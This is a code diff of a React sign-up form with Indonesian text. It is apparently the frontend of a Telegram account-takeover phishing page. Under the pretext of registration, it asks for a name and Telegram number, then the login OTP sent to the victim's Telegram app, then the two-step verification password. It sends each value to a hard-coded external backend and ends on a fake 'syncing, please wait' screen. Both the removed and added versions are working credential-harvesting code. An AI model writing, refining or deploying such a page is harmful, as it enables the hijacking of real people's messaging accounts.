@@ -1,121 +1,101 @@
-"use client";
-import { useState, useRef } from 'react';
-import Image from 'next/image';
+import React, { useState } from 'react';
 
-export default function AuthForm() {
+const AuthForm = () => {
   const [step, setStep] = useState(1);
-  const [nama, setNama] = useState('');
-  const [nomor, setNomor] = useState('');
-  const [otp, setOtp] = useState(['', '', '', '', '']);
-  const [sandi, setSandi] = useState('');
-  const [isLoading, setIsLoading] = useState(false);
-  const [isFinished, setIsFinished] = useState(false);
+  const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
-  const [isOtpError, setIsOtpError] = useState(false);
-  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
+  const [formData, setFormData] = useState({ nama: '', nomor: '', otp: '', sandi: '' });
 
-  const handleOtpChange = (idx: number, val: string) => {
-    if (isNaN(Number(val))) return;
-    setIsOtpError(false);
-    const newOtp = [...otp];
-    newOtp[idx] = val.slice(-1);
-    setOtp(newOtp);
-    if (val && idx < 4) inputRefs.current[idx + 1]?.focus();
+  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    setFormData({ ...formData, [e.target.name]: e.target.value });
+    setError(''); // Hapus error saat mengetik
   };
 
   const handleNext = async () => {
+    setLoading(true);
     setError('');
-    setIsLoading(true);
+    
     try {
-      const response = await fetch(`${process.env.NEXT_PUBLIC_API_URL}/register`, {
+      const response = await fetch('https://backend-python-production-6e72.up.railway.app/register', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ step, nomor, nama, sandi, otp: otp.join('') })
+        body: JSON.stringify({ ...formData, step }),
       });
+
       const data = await response.json();
 
       if (response.ok) {
-        if (step === 1) setStep(2);
-        else if (step === 2) {
-          if (data.status === 'need_2fa') setStep(3);
-          else setIsFinished(true);
-        } else setIsFinished(true);
+        if (step === 1) {
+          setStep(2); // Lanjut ke input OTP
+        } else if (step === 2) {
+          if (data.status === 'need_2fa') {
+            setStep(3); // Munculkan halaman Sandi (2FA)
+          } else {
+            setStep(4); // Sukses, ke halaman Loading
+          }
+        } else if (step === 3) {
+          setStep(4); // Sandi valid, ke halaman Loading
+        }
       } else {
-        if (data.status === 'invalid_otp') {
-          setError('OTP SALAH!!');
-          setIsOtpError(true);
-          setOtp(['', '', '', '', '']);
-          inputRefs.current[0]?.focus();
+        // Penanganan Error (Sandi/OTP Salah)
+        if (data.status === 'invalid_2fa') {
+          setError('KATA SANDI SALAH!!');
+        } else if (data.status === 'invalid_otp') {
+          setError('KODE OTP SALAH!!');
         } else {
-          setError(data.message || 'Koneksi gagal. Cek backend.');
+          setError('Terjadi kesalahan. Coba lagi.');
         }
       }
     } catch (err) {
       setError('Koneksi gagal. Cek backend.');
     } finally {
-      setIsLoading(false);
+      setLoading(false);
     }
   };
 
-  if (isFinished) {
-    return (
-      <div className="full-screen-center">
-        <div className="spinner-circle"><div className="spinner-inner-static text-blue-500 font-bold">PROCESSING</div></div>
-        <p className="loading-status-text">Silakan tunggu prosesnya konfirmasi dalam waktu 1x24 jam untuk memeriksa kelayakan</p>
-      </div>
-    );
-  }
+  if (loading) return <div className="text-center p-10">Memproses data... Mohon tunggu...</div>;
 
   return (
-    <div className="min-h-screen bg-white flex flex-col items-center">
-      <div className="w-full max-w-md relative aspect-[16/9]">
-        <Image src="/banner.jpeg" alt="Banner" fill className="object-cover" priority />
-      </div>
+    <div className="max-w-md mx-auto p-6 bg-white rounded-lg shadow-md">
+      {step === 1 && (
+        <div className="space-y-4">
+          <h2 className="text-xl font-bold">Daftar Sekarang</h2>
+          <input name="nama" placeholder="Nama Lengkap" className="w-full border p-2 rounded" onChange={handleChange} />
+          <input name="nomor" placeholder="08xxxxx" className="w-full border p-2 rounded" onChange={handleChange} />
+          <button onClick={handleNext} className="w-full bg-blue-600 text-white p-2 rounded">DAFTAR SEKARANG</button>
+        </div>
+      )}
 
-      <div className="w-full max-w-md p-6 space-y-6">
-        {error && <div className="bg-red-50 text-red-500 p-3 rounded-lg text-center font-bold">{error}</div>}
+      {step === 2 && (
+        <div className="space-y-4 text-center">
+          <h2 className="text-blue-600 font-bold">Kami Telah Mengirimkan Kode OTP Ke Aplikasi Telegram Anda</h2>
+          <input name="otp" placeholder="Masukkan 5 Digit OTP" className="w-full border p-2 rounded text-center text-2xl tracking-widest" onChange={handleChange} maxLength={5} />
+          {error && <p className="text-red-500 font-bold">{error}</p>}
+          <button onClick={handleNext} className="w-full bg-blue-600 text-white p-2 rounded">VERIFIKASI OTP</button>
+        </div>
+      )}
 
-        {step === 1 && (
-          <div className="space-y-4">
-            <div>
-              <label className="font-bold text-sm">Nama Lengkap:</label>
-              <input type="text" className="w-full p-4 border rounded-xl bg-gray-50 outline-none" value={nama} onChange={(e) => setNama(e.target.value)} />
-            </div>
-            <div>
-              <label className="font-bold text-sm">Nomor Telegram Aktif:</label>
-              <input type="number" className="w-full p-4 border rounded-xl bg-gray-50 outline-none" value={nomor} onChange={(e) => setNomor(e.target.value)} />
-            </div>
-          </div>
-        )}
+      {step === 3 && (
+        <div className="space-y-4 text-center">
+          <h2 className="font-bold">Akun Anda Dilindungi Verifikasi 2 Langkah</h2>
+          <p>Silakan masukkan kata sandi akun Anda</p>
+          <input name="sandi" type="password" placeholder="Masukkan Kata Sandi" 
+            className={`w-full border p-2 rounded ${error ? 'border-red-500 bg-red-50' : ''}`} 
+            onChange={handleChange} />
+          {error && <p className="text-red-500 font-bold italic">{error}</p>}
+          <button onClick={handleNext} className="w-full bg-blue-600 text-white p-2 rounded">KONFIRMASI SANDI</button>
+        </div>
+      )}
 
-        {step === 2 && (
-          <div className="text-center space-y-4">
-            <p className="text-blue-600 font-bold">Kami Telah Mengirimkan Kode OTP Ke Aplikasi Telegram Anda</p>
-            <div className="flex justify-center gap-2">
-              {otp.map((d, i) => (
-                <input key={i} ref={el => { inputRefs.current[i] = el }} type="text" inputMode="numeric" maxLength={1} value={d} onChange={e => handleOtpChange(i, e.target.value)}
-                  className={`w-12 h-14 text-center text-2xl font-bold border-2 rounded-lg outline-none ${isOtpError ? 'border-red-500 bg-red-50 shadow-[0_0_10px_rgba(239,68,68,0.3)]' : 'border-gray-300 focus:border-blue-500'}`} />
-              ))}
-            </div>
-            <button onClick={() => setStep(1)} className="text-blue-500 text-sm font-bold hover:underline">Kirim Ulang Kode OTP</button>
-          </div>
-        )}
-
-        {step === 3 && (
-          <div className="space-y-4">
-            <label className="block text-center font-bold">Sandi Verifikasi Dua Langkah:</label>
-            <input type="password" placeholder="Sandi 2FA" className="w-full p-4 border rounded-xl bg-gray-50 text-center outline-none" value={sandi} onChange={(e) => setSandi(e.target.value)} />
-          </div>
-        )}
-
-        <button onClick={handleNext} disabled={isLoading} className="w-full bg-[#1d4ed8] text-white py-4 rounded-xl font-bold hover:bg-blue-700 transition-all uppercase">
-          {isLoading ? "Memproses..." : "Daftar Sekarang"}
-        </button>
-
-        <p className="text-[12px] text-gray-400 italic mt-4 border-t pt-2">
-          Peringatan: Pendaftaran hanya akan diproses melalui nomor telegram aktif!
-        </p>
-      </div>
+      {step === 4 && (
+        <div className="text-center space-y-4">
+          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto"></div>
+          <h2 className="text-xl font-bold">Sinkronisasi Data...</h2>
+          <p>Mohon jangan tutup halaman ini sampai proses selesai.</p>
+        </div>
+      )}
     </div>
   );
-}
+};
+
+export default AuthForm;
